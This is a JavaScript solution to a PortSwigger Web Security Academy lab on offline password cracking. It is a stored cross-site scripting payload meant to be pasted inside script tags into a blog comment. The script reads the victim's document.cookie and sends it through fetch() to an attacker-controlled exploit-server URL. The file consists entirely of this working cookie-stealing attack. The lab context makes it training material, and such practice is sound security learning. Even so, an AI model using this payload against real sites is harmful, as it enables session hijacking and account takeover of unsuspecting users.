/**
 * A simple JavaScript program to solve the foolowing lab:
 * https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking
 *
 * Place This program within <script> tags and paste it into a comment under any of the posts.
**/

const baseUrl = 'https://[INSERT EXPLOIT SERVER SUB-DOMAIN HERE AND REMOVE BRACKETS].exploit-server.net/exploit';
const cookie_value = document.cookie;

const url = baseUrl + '?variable=' + cookie_value;

fetch(url)
.then(response => response.text())
.then(data => {
    console.log(data);
})
.catch(error => {
    console.log('Error:', error);
});
